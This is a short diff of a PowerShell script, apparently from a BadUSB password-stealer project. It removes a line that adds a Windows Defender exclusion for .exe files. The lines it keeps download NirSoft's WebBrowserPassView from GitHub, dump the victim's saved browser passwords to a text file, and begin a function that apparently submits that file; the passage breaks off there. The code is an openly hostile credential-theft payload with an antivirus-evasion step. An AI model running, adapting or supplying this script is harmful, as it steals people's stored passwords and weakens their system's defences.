@@ -1,5 +1,4 @@
 Set-Location C:\temp
-Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
 Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe #Download the nirsoft tool
 .\WebBrowserPassView.exe /stext passwords.txt #Create the file for Browser passwords
 function Submit-TextFile($filePath){
